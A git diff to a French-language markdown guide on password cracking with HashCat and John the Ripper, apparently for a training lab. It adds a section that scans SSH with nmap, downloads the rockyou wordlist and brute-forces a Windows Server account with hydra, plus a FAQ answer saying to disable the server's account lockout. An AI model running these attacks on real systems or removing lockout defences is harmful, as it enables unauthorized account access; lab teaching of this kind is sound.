@@ -7,6 +7,8 @@
 - [**John The Ripper**](#johntheripper)
   -  [**Utilisation de base**](#utilisation-de-base-1)
   -  [**Utilisation avancée**](#utilisation-avancée-1)
+
+- [**Effectuer des attaques sur le mot de passe d’un compte local du serveur**](effectuer-des-attaques-sur-le-mot-de-passe-d-un-compte-local-du-serveur)
 - [**FAQ**](#faq)
 
 # Guide d'utilisation HashCat
@@ -163,6 +165,30 @@ Cela peut prendre beaucoup de temps suivant la compléxité du mot de passe.
 
 Une fois fini vous avez récupéré votre mot de passe ! 
 
+
+# Effectuer des attaques sur le mot de passe d’un compte local du serveur
+
+Pour pouvoir attaquer le mot de passe d'un compte local , ici sur Windows serveur, nous allons devoir vérifier si le port **SSH** est ouvert grâce au logiciel **nmap**.
+
+```bash 
+nmap -p 22 172.16.10.5
+```
+![CHECKIP]()
+
+Une fois la vérification faîtes, nous allons télécharger une worldlist pour pouvoir lancer l'attaque.
+
+``` bash
+curl -L https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o /root/rockyou.txt
+```
+
+On peut maintenant lancer l'attaque pour récupérer le mot de passe Utilisateur, ici *Wilder*.
+
+``` bash
+hydra -l Wilder -P rockyou.txt -t 1 -W 10 ssh://172.16.10.5
+```
+![RESULTAT]()
+
+Voilà, vous avez récupéré le mot de passe utilisateur.
 ## FAQ
 
 **Q1**: J'ai une erreur **113** lorsque j'essaye de récupérer le fichier1.zip sur ma machine Windows.
@@ -172,3 +198,7 @@ Une fois fini vous avez récupéré votre mot de passe !
 **Q2**: Lorsque je veux décrypter mon hash, il me dit **No hashed loaded**.
 
 **R2**: Vérifiez bien que le hash ne commence pas par le nom du fichier zip, dans ce cas utilisez la commande pour nettoyer le hash.
+
+**Q3**: Quand je lance l'attaque Hydra, il me dit : Error all children were disabled due too many connection errors.
+
+**R3**: Ce message s'affiche lorsque le Windows Serveur met en place le blocage de tentative de connexion a un compte après avoir échoué plusieurs mot de passes. Vous pouvez l'enlever directement sur Windows Serveur, ou en ligne de commande. 
